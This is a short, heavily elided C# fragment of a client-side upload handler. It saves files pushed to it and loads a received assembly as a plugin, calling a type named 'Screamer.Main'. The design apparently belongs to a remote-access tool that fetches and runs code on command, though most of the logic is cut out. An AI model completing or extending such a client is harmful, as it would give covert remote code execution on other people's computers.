...
namespace Client.Handlers
{
    internal class HandleUpload
    {
        public void Init(Unpack unpack)
        {
            try
            {
                if (unpack.GetAsBoolen("isCompleted"))
                {
                    ...
                    sfile(duid, fileName, filePath, TempCount, fileSize, isPlugin);
                }
                else
                {
        ...
        public void sfile(string duid, string fileName, string filePath, long TempCount, long fileLength, bool isPlugin)
        {
            if (TempCount > 0)
            {
                Thread.Sleep(3000);
        ...
        public void ExecutePlugin(string directory, string fileName)
        {
            try
            {
                ...
                Type mainClassType = pluginAssembly.GetType("Screamer.Main");
